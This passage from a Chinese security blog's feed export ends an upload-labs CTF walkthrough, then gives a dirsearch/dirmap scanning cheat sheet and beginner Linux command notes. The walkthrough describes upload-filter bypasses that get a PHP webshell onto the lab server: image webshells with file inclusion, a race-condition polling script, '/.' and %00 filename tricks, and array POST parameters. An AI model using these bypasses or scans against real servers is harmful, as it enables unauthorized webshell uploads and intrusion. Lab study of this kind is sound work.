class=""><p>这关是先检查了后缀名，然后上传，然后在进行二次渲染。这时我们只能上传图片马，而且得配合apache解析漏洞或文件包含进行通关</p><p>这关和上一关操作差不多，不过得改一下python脚本：</p><p>import requests</p><pre><code>url = &quot;http://xxx.xxx.xxx.xxx/upload-labs/include.php/?file=./upload/haha.pngwhile True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>这里注意一下最后访问的URL为<a href="http://xxx.xxx.xxx.xxx/upload-labs/Tony.php">http://xxx.xxx.xxx.xxx/upload-labs/Tony.php</a></p><h3 id="Pass20-x2F-绕过"><a href="#Pass20-x2F-绕过" class="headerlink" title="Pass20 &#x2F;.绕过"></a>Pass20 &#x2F;.绕过</h3><p>move_uploaded_file()会忽略掉文件末尾的<code>/.</code></p><p><code>save_name</code> 可控，就可以直接将文件名写成haha.php&#x2F;.</p><p>也可以用%00截断绕过</p><h3 id="Pass21"><a href="#Pass21" class="headerlink" title="Pass21"></a>Pass21</h3><p>参考别人得wp：</p><pre><code>这一关白名单验证过程：--&gt; 验证上传路径是否存在--&gt; 验证[&#39;upload_file&#39;]的content-type是否合法（可以抓包修改）--&gt; 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）--&gt;判断file不是数组则使用explode(&#39;.&#39;, strtolower($file))对file进行切割，将file变为一个数组--&gt; 判断数组最后一个元素是否合法--&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name--&gt; 上传文件</code></pre><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210539.png" class=""><p>上传一句话png，burp抓包并改包：</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210652.png" class=""><pre><code>修改POST参数为数组类型，索引[0]为`haha.php`，索引[2]为`jpg|png|gif`。 只要第二个索引`不为1`，$file[count($file) - 1]就等价于$file[2-1]，值为空</code></pre><p>最后，服务端就成功存在了haha.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具使用速查手册</title>
      <link href="/2023/04/15/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
      <url>/2023/04/15/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>dirsearch是一个用于探测WEB服务器下的<strong>敏感文件&#x2F;目录</strong>的命令行工具</p><p>常用选项：</p><pre><code>-u --url 指定网址-e 指定站点文件类型列表(以逗号分隔的扩展列表，如：php,asp)-w 用指定爆破字典执行，若存在多个通过逗号分隔-r 递归扫描目录（跑出目录后，继续跑目录下面的目录）-R 最大递归扫描级别-t 线程数-l --url-list=FILE   目标url文件路径-i 保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)-x 排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)--proxy 使用代理-m HTTP请求方法，默认为GET-d HTTP请求数据</code></pre><p>常用命令：</p><pre><code>#默认方式扫描单个urlpython3 dirsearch.py -u https://target#指定要扫描的文件类型python3 dirsearch.py -u https://target -e php,txt,js #扫描所有文件类型python dirsearch.py -u http://222.93.xx.xx:8090 -e*#采用指定路径的字典扫描目标python3 dirsearch.py -u https://target -w /path/to/wordlist(wordlist.txt)#批量扫描目标python dirsearch.py -l D:\dirsearch-master\url\url.txt#递归扫描，不过容易被检测，且比较耗时python dirsearch.py -u http://xxxx -r#采用递归扫描递归层数为三层python3 dirsearch.py -u https://target -r -R 3#线程控制请求速率python dirsearch.py -u http://xxxx -t 30#使用代理python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080#POST请求python3 dirsearch.py -u https://target -w db/dicc.txt -m POST --data &quot;username=admin&quot;</code></pre><p>输出报告格式：</p><pre><code>--simple-report=OUTPUTFILE               简洁报告--plain-text-report=OUTPUTFILE               纯文本格式报告--json-report=OUTPUTFILE               json格式报告--xml-report=OUTPUTFILE               xml格式报告--markdown-report=OUTPUTFILE               markdown格式报告</code></pre><p>字典文件在db文件夹下，生成的报告的在reports文件夹下</p><h3 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h3><p>一个高级web目录、文件扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑。</p><p>基础使用：</p><pre><code>#扫描单目标python3 dirmap.py -i https://target.com -lcfpython3 dirmap.py -i 192.168.1.1 -lcf#扫描多目标python3 dirmap.py -iF targets.txt -lcf#扫描子网python3 dirmap.py -i 192.168.1.0/24 -lcf#网络范围python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf</code></pre><p>高级使用：</p><p>暂时采用加载配置文件的方式进行详细配置，<strong>不支持使用命令行参数进行详细配置</strong>！</p><p>编辑项目根目录下的<code>dirmap.conf</code>，进行配置</p><pre><code>#递归扫描处理配置[RecursiveScan]#是否开启递归扫描:关闭:0;开启:1conf.recursive_scan = 0#遇到这些状态码，开启递归扫描。默认配置[301,403]conf.recursive_status_code = [301,403]#URL超过这个长度就退出扫描conf.recursive_scan_max_url_length = 60#这些后缀名不递归扫conf.recursive_blacklist_exts = [&quot;html&quot;,&#39;htm&#39;,&#39;shtml&#39;,&#39;png&#39;,&#39;jpg&#39;,&#39;webp&#39;,&#39;bmp&#39;,&#39;js&#39;,&#39;css&#39;,&#39;pdf&#39;,&#39;ini&#39;,&#39;mp3&#39;,&#39;mp4&#39;]#设置排除扫描的目录。默认配置空。其他配置：e.g:[&#39;/test1&#39;,&#39;/test2&#39;]#conf.exclude_subdirs = [&#39;/test1&#39;,&#39;/test2&#39;]conf.exclude_subdirs = &quot;&quot;#扫描模式处理配置(4个模式，1次只能选择1个)[ScanModeHandler]#字典模式:关闭:0;单字典:1;多字典:2conf.dict_mode = 1#单字典模式的路径conf.dict_mode_load_single_dict = &quot;dict_mode_dict.txt&quot;#多字典模式的路径，默认配置dictmultconf.dict_mode_load_mult_dict = &quot;dictmult&quot;#爆破模式:关闭:0;开启:1conf.blast_mode = 0#生成字典最小长度。默认配置3conf.blast_mode_min = 3#生成字典最大长度。默认配置3conf.blast_mode_max = 3#默认字符集:a-z。暂未使用。conf.blast_mode_az = &quot;abcdefghijklmnopqrstuvwxyz&quot;#默认字符集:0-9。暂未使用。conf.blast_mode_num = &quot;0123456789&quot;#自定义字符集。默认配置&quot;abc&quot;。使用abc构造字典conf.blast_mode_custom_charset = &quot;abc&quot;#自定义继续字符集。默认配置空。conf.blast_mode_resume_charset = &quot;&quot;#爬虫模式:关闭:0;开启:1conf.crawl_mode = 0#用于生成动态敏感文件payload的后缀字典conf.crawl_mode_dynamic_fuzz_suffix = &quot;crawl_mode_suffix.txt&quot;#解析robots.txt文件。暂未实现。conf.crawl_mode_parse_robots = 0#解析html页面的xpath表达式conf.crawl_mode_parse_html = &quot;//*/@href | //*/@src | //form/@action&quot;#是否进行动态爬虫字典生成。默认配置1，开启爬虫动态字典生成。其他配置：e.g:关闭:0;开启:1conf.crawl_mode_dynamic_fuzz = 1#Fuzz模式:关闭:0;单字典:1;多字典:2conf.fuzz_mode = 0#单字典模式的路径。conf.fuzz_mode_load_single_dict = &quot;fuzz_mode_dir.txt&quot;#多字典模式的路径。默认配置:fuzzmultconf.fuzz_mode_load_mult_dict = &quot;fuzzmult&quot;#设置fuzz标签。默认配置&#123;dir&#125;。使用&#123;dir&#125;标签当成字典插入点，将http://target.com/&#123;dir&#125;.php替换成http://target.com/字典中的每一行.php。其他配置：e.g:&#123;dir&#125;;&#123;ext&#125;#conf.fuzz_mode_label = &quot;&#123;ext&#125;&quot;conf.fuzz_mode_label = &quot;&#123;dir&#125;&quot;#处理payload配置。暂未实现。[PayloadHandler]#处理请求配置[RequestHandler]#自定义请求头。默认配置空。其他配置：e.g:test1=test1,test2=test2#conf.request_headers = &quot;test1=test1,test2=test2&quot;conf.request_headers = &quot;&quot;#自定义请求User-Agent。默认配置chrome的ua。conf.request_header_ua = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&quot;#自定义请求cookie。默认配置空，不设置cookie。其他配置e.g:cookie1=cookie1; cookie2=cookie2;#conf.request_header_cookie = &quot;cookie1=cookie1; cookie2=cookie2&quot;conf.request_header_cookie = &quot;&quot;#自定义401认证。暂未实现。因为自定义请求头功能可满足该需求(懒XD)conf.request_header_401_auth = &quot;&quot;#自定义请求方法。默认配置get方法。其他配置：e.g:get;head#conf.request_method = &quot;head&quot;conf.request_method = &quot;get&quot;#自定义每个请求超时时间。默认配置3秒。conf.request_timeout = 3#随机延迟(0-x)秒发送请求。参数必须是整数。默认配置0秒，无延迟。conf.request_delay = 0#自定义单个目标，请求协程线程数。默认配置30线程conf.request_limit = 30#自定义最大重试次数。暂未实现。conf.request_max_retries = 1#设置持久连接。是否使用session()。暂未实现。conf.request_persistent_connect = 0#302重定向。默认False，不重定向。其他配置：e.g:True;Falseconf.redirection_302 = False#payload后添加后缀。默认空，扫描时，不添加后缀。其他配置：e.g:txt;php;asp;jsp#conf.file_extension = &quot;txt&quot;conf.file_extension = &quot;&quot;#处理响应配置[ResponseHandler]#设置要记录的响应状态。默认配置[200]，记录200状态码。其他配置：e.g:[200,403,301]#conf.response_status_code = [200,403,301]conf.response_status_code = [200]#是否记录content-type响应头。默认配置1记录#conf.response_header_content_type = 0conf.response_header_content_type = 1#是否记录页面大小。默认配置1记录#conf.response_size = 0conf.response_size = 1#是否自动检测404页面。默认配置True，开启自动检测404.其他配置参考e.g:True;False#conf.auto_check_404_page = Falseconf.auto_check_404_page = True#自定义匹配503页面正则。暂未实现。感觉用不着，可能要废弃。#conf.custom_503_page = &quot;page 503&quot;conf.custom_503_page = &quot;&quot;#自定义正则表达式，匹配页面内容#conf.custom_response_page = &quot;([0-9])&#123;3&#125;([a-z])&#123;3&#125;test&quot;conf.custom_response_page = &quot;&quot;#跳过显示页面大小为x的页面，若不设置，请配置成&quot;None&quot;，默认配置“None”。其他大小配置参考e.g:None;0b;1k;1m#conf.skip_size = &quot;0b&quot;conf.skip_size = &quot;None&quot;#代理选项[ProxyHandler]#代理配置。默认设置“None”，不开启代理。其他配置e.g:&#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;&#125;#conf.proxy_server = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;&#125;conf.proxy_server = None#Debug选项[DebugMode]#打印payloads并退出conf.debug = 0#update选项[CheckUpdate]#github获取更新。暂未实现。conf.update = 0</code></pre><p>默认字典文件：</p><pre><code>dict_mode_dict.txt “字典模式”字典，使用dirsearch默认字典；crawl_mode_suffix.txt “爬虫模式”字典，使用FileSensor默认字典；fuzz_mode_dir.txt “fuzz模式”字典，使用DirBuster默认字典；fuzz_mode_ext.txt “fuzz模式”字典，使用常见后缀制作的字典；dictmult该目录为“字典模式”默认多字典文件夹，包含：BAK.min.txt(备份文件小字典)，BAK.txt(备份文件大字典)，LEAKS.txt(信息泄露文件字典)；fuzzmult该目录为“fuzz模式”默认多字典文件夹，包含：fuzz_mode_dir.txt(默认目录字典)，fuzz_mode_ext.txt(默认后缀字典)。</code></pre><p>字典文件存放在项目根目录中的<code>data</code>文件夹中，结果将自动保存在项目根目录下的<code>output</code>文件夹中，结果自动去重复，不用担心产生大量冗余</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux学习</title>
      <link href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/14/linux%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="linux目录结构"><a href="#linux目录结构" class="headerlink" title="linux目录结构"></a>linux目录结构</h2><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11230.jpg" class=""><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11231.png" class=""><h2 id="linux基础命令"><a href="#linux基础命令" class="headerlink" title="linux基础命令"></a>linux基础命令</h2><h3 id="单用户操作系统和多用户操作系统"><a href="#单用户操作系统和多用户操作系统" class="headerlink" title="单用户操作系统和多用户操作系统"></a>单用户操作系统和多用户操作系统</h3><p><strong>单用户操作系统：</strong>指一台计算机在同一时间只能由一个用户使用，一个用户独自享用全部的软件和硬件资源。</p><p>​windows xp之前的版本都是单用户操作系统</p><p><strong>多用户操作系统：</strong>指一台计算机在同一时间可以由多个用户使用，多个用户共同享用全部的软件和硬件资源。</p><p>​Unix和linux的设计初衷就是多用户操作系统</p><h3 id="1-常用linux命令的基本使用"><a href="#1-常用linux命令的基本使用" class="headerlink" title="1.常用linux命令的基本使用"></a>1.常用linux命令的基本使用</h3><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">ls</td><td align="center">查看当前文件夹下的内容</td></tr><tr><td align="center">pwd</td><td align="center">查看当前所在文件夹</td></tr><tr><td align="center">cd [目录名]</td><td align="center">切换文件夹</td></tr><tr><td align="center">touch [文件名]</td><td align="center">如果文件不存在，新建文件</td></tr><tr><td align="center">mkdir [目录名]</td><td align="center">创建目录</td></tr><tr><td align="center">rm [文件名]</td><td align="center">删除指定的文件名</td></tr><tr><td align="center">clear</td><td align="center">清屏</td></tr></tbody></table><h4 id="查阅命令帮助信息"><a href="#查阅命令帮助信息" class="headerlink" title="查阅命令帮助信息"></a>查阅命令帮助信息</h4><pre><code>1. command --help2. man command</code></pre><p>使用man时的操作键：</p><table><thead><tr><th align="center">操作键</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">手册页的下一页</td></tr><tr><td align="center">b</td><td align="center">回滚一屏</td></tr><tr><td align="center">Enter键</td><td align="center">一次滚动手册页的一行</td></tr><tr><td align="center">q</td><td align="center">退出</td></tr></tbody></table><h4 id="ls常用参数"><a href="#ls常用参数" class="headerlink" title="ls常用参数:"></a>ls常用参数:</h4><table><thead><tr><th align="center">参数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-a</td><td align="center">显示指定目录下所有子目录与文件，包括隐藏文件</td></tr><tr><td align="center">-l</td><td align="center">以列表方式显示文件的详细信息</td></tr><tr><td align="center">-h</td><td align="center">配合 -l以人性化的方式显示文件大小</td></tr></tbody></table><h4 id="ls通配符的使用："><a href="#ls通配符的使用：" class="headerlink" title="ls通配符的使用："></a>ls通配符的使用：</h4><table><thead><tr><th align="center">通配符</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">代表任意个数个字符</td></tr><tr><td align="center">?</td><td align="center">代表任意一个字符，必须是一个</td></tr><tr><td align="center">[]</td><td align="center">表示可以匹配字符组中的任一一个。例如[123]、[a-f]</td></tr></tbody></table><h4 id="cd常用参数："><a href="#cd常用参数：" class="headerlink" title="cd常用参数："></a>cd常用参数：</h4><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>cd</td><td>切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)</td></tr><tr><td>cd ~</td><td>切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)</td></tr><tr><td>cd -</td><td>可以在最近两次工作目录之间来回切换</td></tr></tbody></table><h4 id="touch扩展："><a href="#touch扩展：" class="headerlink" title="touch扩展："></a>touch扩展：</h4><p>​如果文件不存在，可以创建一个空白文件</p><p>​如果文件已经存在，可以修改文件的末次修改日期</p><h4 id="mkdir常用参数："><a href="#mkdir常用参数：" class="headerlink" title="mkdir常用参数："></a>mkdir常用参数：</h4><table><thead><tr><th align="center">参数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-p</td><td align="center">可以递归创建目录</td></tr></tbody></table><p>注意：在当前目录中，目录与文件不能同名</p><h4 id="rm常用参数："><a href="#rm常用参数：" class="headerlink" title="rm常用参数："></a>rm常用参数：</h4><p>rm删除的内容不能恢复！</p><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-r</td><td align="center"><strong>删除目录时必须使用次参数</strong>，并且能递归删除目录下的内容</td></tr><tr><td align="center">-f</td><td align="center">强制删除，忽略不存在的文件，无需提示</td></tr></tbody></table><h3 id="2-拷贝和移动文件"><a href="#2-拷贝和移动文件" class="headerlink" title="2.拷贝和移动文件"></a>2.拷贝和移动文件</h3><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">tree</td><td align="center">以树状图列出文件目录结构</td></tr><tr><td align="center">cp 源文件 目标文件</td><td align="center">复制文件</td></tr><tr><td align="center">mv 源文件 目标文件</td><td align="center">移动文件或者目录&#x2F;文件或者目录重命名</td></tr></tbody></table><h4 id="tree"><a href="#tree" class="headerlink" title="tree:"></a>tree:</h4><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-d</td><td align="center">只显示目录</td></tr></tbody></table><h4 id="cp"><a href="#cp" class="headerlink" title="cp:"></a>cp:</h4><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-i</td><td align="center">覆盖文件前提示</td></tr><tr><td align="center">-r</td><td align="center">若给出的源文件是目录文件，则cp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td></tr></tbody></table><h4 id="mv"><a href="#mv" class="headerlink" title="mv:"></a>mv:</h4><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-i</td><td align="center">覆盖文件前提示</td></tr></tbody></table><h3 id="3-查看文件内容"><a href="#3-查看文件内容" class="headerlink" title="3.查看文件内容"></a>3.查看文件内容</h3><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">cat 文件名</td><td align="center">查看文件内容、创建文件、文件合并、追加文件内容等功能</td></tr><tr><td align="center">more 文件名</td><td align="center">分屏显示文件内容</td></tr><tr><td align="center">grep 搜索文本 文件名</td><td align="center">搜索文本文件内容</td></tr></tbody></table><h4 id="cat"><a href="#cat" class="headerlink" title="cat:"></a>cat:</h4><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-b</td><td align="center">对非空输出行编号</td></tr><tr><td align="center">-n</td><td align="center">对输出的所有行编号</td></tr></tbody></table><h4 id="grep"><a href="#grep" class="headerlink" title="grep:"></a>grep:</h4><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-n</td><td align="center">显示匹配行及行号</td></tr><tr><td align="center">-v</td><td align="center">显示不包括含匹配文本的所有行</td></tr><tr><td align="center">-i</td><td align="center">忽略大小写</td></tr></tbody></table><p>grep允许对文本进行模式查找，所谓模式查找，又被称为正则表达式</p><table><thead><tr><th align="center">参数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">^a</td><td align="center">行首，搜村以a开头的行</td></tr><tr><td align="center">ke$</td><td align="center">行尾，搜寻以ke结束的行</td></tr></tbody></table><h3 id="4-输出"><a href="#4-输出" class="headerlink" title="4.输出"></a>4.输出</h3><h4 id="echo-文字内容"><a href="#echo-文字内容" class="headerlink" title="echo 文字内容"></a>echo 文字内容</h4><p>​echo 会在终端显示参数指定的文字，通常会和重定向联合使用</p><h4 id="重定向-gt-和-gt-gt"><a href="#重定向-gt-和-gt-gt" class="headerlink" title="重定向&gt;和&gt;&gt;"></a>重定向&gt;和&gt;&gt;</h4><p>linux允许将命令执行结果重定向到一个文件，将本应显示在终端上的内容输出&#x2F;追加到指定文件中</p><p>​&gt;表示输出，会覆盖文件原有内容</p><p>​&gt;&gt; 表示追加，会将内容追加到已有文件的末尾</p><h4 id="管道"><a href="#管道" class="headerlink" title="管道|"></a>管道|</h4><p>linux允许将一个命令的输出可以通过管道 <strong>|</strong> 作为另一个命令的输入</p><p>常用的管道命令有：</p><p>more、grep</p><h3 id="5-远程管理命令"><a href="#5-远程管理命令" class="headerlink" title="5.远程管理命令"></a>5.远程管理命令</h3><h4 id="shutdown："><a href="#shutdown：" class="headerlink" title="shutdown："></a>shutdown：</h4><table><thead><tr><th align="center">命令</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">shutdown 选项 时间</td><td align="center">关机&#x2F;重启</td></tr><tr><td align="center">shutdown now&#x2F;20:25</td><td align="center">立刻&#x2F;20:25关机</td></tr><tr><td align="center">shutdown -r now&#x2F;20:25</td><td align="center">立刻&#x2F;20:25重启</td></tr><tr><td align="center">shutdown +10</td><td align="center">系统再过十分钟关机</td></tr><tr><td align="center">shutdown -c</td><td align="center">取消之前的关机计划</td></tr></tbody></table><p>若不指定选项和参数，默认表示1分钟之后关闭电脑</p><h4 id="远程登录和复制文件："><a href="#远程登录和复制文件：" class="headerlink" title="远程登录和复制文件："></a>远程登录和复制文件：</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">ssh 用户名@ip</td><td align="center">远程登录会话</td></tr><tr><td align="center">scp 用户名@ip:文件名或路径   用户名@ip:文件名或路径</td><td align="center">远程复制文件</td></tr></tbody></table><h4 id="ssh："><a href="#ssh：" class="headerlink" title="ssh："></a>ssh：</h4><p>​数据传输是加密的，可以防止信息泄露</p><p>​数据传输是压缩的，可以提高传输速度</p><pre><code>ssh [-p port] user@ip//port是SSH Server监听的端口，如果不指定，就默认为22</code></pre><p>免密码登录：</p><pre><code>1.配置公私钥： 执行 ssh-keygen即可生成ssh钥匙，一路回车即可2.上传公钥(id_rsa.pub)到服务器: 执行 ssh-copy-id -p port user@ip ，可以让远程服务记住我们的公钥</code></pre><p>配置别名：</p><pre><code>在~/.ssh/config里面追加以下内容：Host win    HostName ip地址    user jack    Port 22</code></pre><p><strong>设置的免密码登录和配置的别名对于scp命令同样适用</strong></p><h4 id="scp"><a href="#scp" class="headerlink" title="scp:"></a>scp:</h4><p>它的地址格式与ssh基本相同，需要注意的是，在制定端口时用的时大写的 -P而不是小写的</p><pre><code>//把本地当前目录下的 01.py文件复制到 远程家目录下的 Desktop/01.py//注意： &#39;:&#39;后面的路径如果不是绝对路径，则以用户的家目录作为参照路径scp -P port 01.py user@ip:Desktop/01.py//把远程家目录下的 Desktop/01.py文件复制到 本地当前目录下的01.pyscp -P port user@ip:Desktop/01.py 01.py#加上 -r 选项可以传送文件夹</code></pre><h3 id="6-用户权限相关命令"><a href="#6-用户权限相关命令" class="headerlink" title="6.用户权限相关命令"></a>6.用户权限相关命令</h3><p>对文件&#x2F;目录的权限包括：</p><table><thead><tr><th align="center">权限</th><th align="center">缩写</th></tr></thead><tbody><tr><td align="center">读</td><td align="center">r</td></tr><tr><td align="center">写</td><td align="center">w</td></tr><tr><td align="center">执行</td><td align="center">x</td></tr></tbody></table><h4 id="组"><a href="#组" class="headerlink" title="组"></a>组</h4><p>为了方便用户管理，提出了<strong>组</strong>的概念</p><h4 id="ls-l扩展"><a href="#ls-l扩展" class="headerlink" title="ls -l扩展"></a>ls -l扩展</h4><p><strong>文件类型，</strong>(“-” 表示普通文件，“d” 表示目录，“l” 表示软链接文件，“p” 表示pipe管道文件，“b” 表示块设备文件，“c” 表示字符设备文件，“s” 表示socket套接字文件，用于实现两个进程间通信)</p><p><strong>权限，</strong>分别表示文件所有者的权限，组的权限和其他用户的权限</p><p><strong>硬链接数，</strong>通俗的讲，就是有多少中方式，可以访问到当前目录&#x2F;文件</p><p><strong>拥有者，</strong>家目录下 文件&#x2F;目录 的拥有者通常都是当前用户</p><p><strong>组，</strong>在linux中，很多时候，会出现组名和用户名相同的情况</p><p><strong>大小</strong></p><p><strong>时间</strong></p><p><strong>名称</strong>（蓝色代表目录&#x2F;文件夹、浅蓝色代表链接文件、绿色代表可执行文件、灰白色代表一般文件、红色代表压缩文件、黄色代表设备文件）</p><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/141143.png" class=""><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/944561.png" class=""><h4 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h4><p>chmod可以修改用户&#x2F;组 对 文件&#x2F;目录的权限</p><p>命令格式：</p><pre><code>chmod +/-rwx 文件名|目录名//会同时修改用户、组和其他用户的权限，不能精准定位</code></pre><p><strong>注：要想在目录下执行终端命令(ls、touch)，就必须要有可执行权限！！！</strong></p><p>chmod在设置权限时，可以简单的使用三个数字，分别对应 <strong>拥有者&#x2F;组和其他</strong> 用户的权限</p><pre><code>chmod -R 755 文件名|目录名R表示递归修改权限</code></pre><table><thead><tr><th align="center">r</th><th align="center">w</th><th align="center">x</th></tr></thead><tbody><tr><td align="center">4</td><td align="center">2</td><td align="center">1</td></tr></tbody></table><h4 id="超级用户"><a href="#超级用户" class="headerlink" title="超级用户"></a>超级用户</h4><p>linux 系统中的root账号通常用于系统的维护和管理，对操作系统的所有资源具有所有访问权限</p><p>在linux安装过程中，系统会自动创建一个用户账号，而这个默认的用户就被称为“标准用户”</p><h4 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h4><p>sudo命令用来以其他身份来执行命令，预设的身份是root</p><p>用户使用sudo时，必须先输入密码，之后有5分钟的有效期限，超过期限则必须重新输入密码</p><h4 id="组管理-终端命令"><a href="#组管理-终端命令" class="headerlink" title="组管理 终端命令"></a>组管理 终端命令</h4><p>​<strong>注：创建组&#x2F;删除组的终端命令都需要通过sudo执行</strong></p><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">groupadd 组名</td><td align="center">添加组</td></tr><tr><td align="center">groupdel 组名</td><td align="center">删除组</td></tr><tr><td align="center">cat &#x2F;etc&#x2F;group</td><td align="center">确认组信息</td></tr><tr><td align="center">chown 用户名 文件名|目录名</td><td align="center">修改文件&#x2F;目录的拥有者</td></tr><tr><td align="center">chgrp  -R 组名 文件&#x2F;目录名</td><td align="center">修改文件&#x2F;目录的所属组</td></tr></tbody></table><h4 id="用户管理-终端命令"><a href="#用户管理-终端命令" class="headerlink" title="用户管理 终端命令"></a>用户管理 终端命令</h4><p>​<strong>注：创建用户&#x2F;删除用户&#x2F;修改其他用户密码 的终端命令都需要通过sudo执行</strong></p><p>创建用户&#x2F;设置密码&#x2F;删除用户</p><table><thead><tr><th align="center">命令</th><th align="center">作用</th><th>说明</th></tr></thead><tbody><tr><td align="center">useradd -m -g 组 新建用户名</td><td align="center">添加新用户</td><td>-m 自动建立用户家目录 | -g 指定用户所在的组，否则会建立一个和用户<strong>同名</strong>的组</td></tr><tr><td align="center">passwd 用户名</td><td align="center">设置用户密码</td><td>如果是普通用户，直接用passwd可以修改自己的账户密码</td></tr><tr><td align="center">userdel -r 用户名</td><td align="center">删除用户</td><td>-r选项会自动删除用户家目录</td></tr><tr><td align="center">cat &#x2F;etc&#x2F;passwd</td><td align="center">确认用户信息</td><td>新建用户后，用户信息会保存在&#x2F;etc&#x2F;passwd文件中</td></tr></tbody></table><h4 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">id [用户名]</td><td align="center">查看用户UID(用户代号，在&#x2F;etc&#x2F;passwd)和GID(组代号，在&#x2F;etc&#x2F;group)信息</td></tr><tr><td align="center">who</td><td align="center">查看当前所有登录的用户列表</td></tr><tr><td align="center">whoami</td><td align="center">查看当前登录用户的账户名</td></tr></tbody></table><h4 id="passwd文件"><a href="#passwd文件" class="headerlink" title="passwd文件"></a>passwd文件</h4><p>&#x2F;etc&#x2F;passwd文件存放的是用户的信息，由6个分号组成的7个信息，分别是</p><p>用户名：密码(x表示加密的密码)：UID：GID：用户全名或本地账号：家目录：登录使用的shell(就是登录之后使用的终端命令)</p><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>usermod可以用来设置用户的 <strong>主组&#x2F;附加组</strong>  和 <strong>登录shell</strong> </p><p><strong>主组：</strong>通常在新建用户时指定，在&#x2F;etc&#x2F;passwd的第4列GID对应的组</p><p><strong>附加组：</strong>在&#x2F;etc&#x2F;group中最后一列表示该组的用户列表，用于指定 <strong>用户的附加权限</strong></p><p>​提示：设置了用户的附加组之后，需要重新登录才能生效！</p><pre><code>//修改用户的主组usermod -g 组 用户名 ！！！慎用！！！注！！！：usemod -G 改写用户的附加组之后，用户的附加组信息是覆盖，也就是说usermod使用户只能存在于一个附加组。//修改用户登录shellusermod -s /bin/bash 用户名</code></pre><p>​注：默认时使用useradd添加的用户是没有权限使用sudo以root身份执行命令的，可以使用usermod -G sudo 用户名 将用户添加到sudo附加组中</p><p>​<strong>注：usemod -G 改写用户的附加组之后，用户的附加组信息是覆盖，也就是说usermod使用户只能存在于一个附加组。</strong>使用户同时属于多个附加组要使用gpasswd:</p><h4 id="gpasswd"><a href="#gpasswd" class="headerlink" title="gpasswd"></a>gpasswd</h4><pre><code>//添加用户到组gpasswd -a 用户名 组名//从组删除用户gpasswd -d 用户名 组名</code></pre><h4 id="which"><a href="#which" class="headerlink" title="which"></a>which</h4><p>which命令可以查看执行命令所在位置，例如：</p><pre><code>which ls# /bin/lswhich useradd# 